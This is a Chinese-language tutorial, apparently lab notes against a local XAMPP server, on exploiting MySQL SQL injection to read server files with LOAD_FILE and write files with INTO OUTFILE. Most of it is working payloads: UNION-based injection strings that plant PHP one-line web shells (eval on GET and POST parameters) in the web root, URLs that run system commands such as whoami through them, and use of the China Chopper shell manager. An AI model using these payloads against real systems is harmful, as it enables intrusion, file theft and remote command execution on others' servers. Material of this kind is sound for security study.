[TOC]



# ==SQL注入-文件读写与木马植入==

## 一、读写权限确认

```sql
show global variables like '%secure%';
查看mysql全局变量的配置，当输入以上命令后，结果：

secure_file_priv 为空时，任意读写
secure_file_priv 为某个路径时，只能在规定的路径下读写
secure_file_priv 为NULL时，则不具有读写权限
```

![image-20240709153754418](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709153754418.png)

## 二、读文件

主要依赖于 `load_file` 函数，但还是得看该账户是否拥有读写权限

利用SQL语句读取系统文件，先读取常规文件（已明确路径），如果读取成功，再读取其他文件。

如果明确知道路径，则直接尝试爆破路径下的文件，否则，先爆破出路径再说。

```sql
select LOAD_FILE('/opt/sshxfiles.sh');
```

![image-20240709173906076](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709173906076.png)

说明该文件读取成功，我们可以邮件并保存在本地

![image-20240709174009218](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709174009218.png)

**尝试在注入过程中去读取文件**

```sql
?articleid=-1 union select 1,(select load_file('/opt/sshxfiles.sh')),3
```

![image-20240709180030356](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709180030356.png)

确实可以看到，然后再使用查看页面源代码就可以正常查看文件了

> 接下来要进行的操作就是遍历该目录下的所有文件然后读取。只需要更换文件路径即可。当然也不要忘记burp的爆破功能。

## 三、写文件

**主要是写入木马**

首先需要确定目标目录是否具有可写的权限，如果没有还需要不断寻找，直至找到可写的目录，该操作可使用python编写

```sql
select "ymqyyds" into OUTFILE "/opt/trojan.php";
select "ymqyyds" into OUTFILE "/tmp/trojan.php";
```

![image-20240709191610147](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709191610147.png)

比如这里，就是没有权限，我们去看一下具体什么情况

![image-20240709191719283](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709191719283.png)

![image-20240709191813882](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709191813882.png)

确实是没有权限，我们去找一个有权限的目录

![image-20240709191908126](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709191908126.png)

![image-20240709191943928](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709191943928.png)



![image-20240709192200983](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709192200983.png)果然成功了

**进入注入情况去尝试，但由于我们实验环境使用的是xampp，因此我们要写的目录必须得是xampp根目录的子目录才可以。否则即使可以正确写入文件，但是我们无法访问。** 就比如我写入刚刚那个 `/tmp/` 目录下，可以正常写入，但无法访问。

如果没有权限，则需加上权限，但是生产环境中又如何加权限呢？？？



![image-20240709193502558](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709193502558.png)

没有报错写入成功

![image-20240709193525414](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709193525414.png)

web访问

![image-20240709193542327](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709193542327.png)

## 四、写和上传木马

最简单的一句话木马，使用get方式获取参数a的值

```sql
?articleid=-1 union select 1,"<?php eval($_GET['a']);?>",3 into outfile "/opt/lampp/htdocs/security/temp/trojan.php"
```

![image-20240709204338559](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709204338559.png)

执行之后只要没报错，然后就去访问该文件并传入a的值，可以使用自己想知道的信息所对应的操作和函数

```url
http://192.168.230.147/security/temp/trojan.php?a=phpinfo();
```

![image-20240709204432968](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709204432968.png)

```url
http://192.168.230.147/security/temp/trojan.php?a=system("ip addr");
```

![image-20240709205237054](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709205237054.png)

```url
http://192.168.230.147/security/temp/trojan.php?a=system(uname -a);
```

![image-20240709205414201](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709205414201.png)

```url
http://192.168.230.147/security/temp/trojan.php?a=system(whoami);
```

![image-20240709205443008](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709205443008.png)

## 五、中国菜刀

使用post传参的方式执行功能

```sql
?articleid=-1 union select 1,"<?php eval($_POST['a']);?>",3 into outfile "/opt/lampp/htdocs/security/temp/trojan2.php"
```

![image-20240709213648100](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709213648100.png)

然后使用post传参的方式传递参数a的值

![image-20240709213807237](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709213807237.png)

然后开启菜刀

![image-20240709223751210](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709223751210.png)

![image-20240709223926099](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709223926099.png)

![image-20240709224008175](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240709224008175.png)

接下来进行任何想做的事情吧

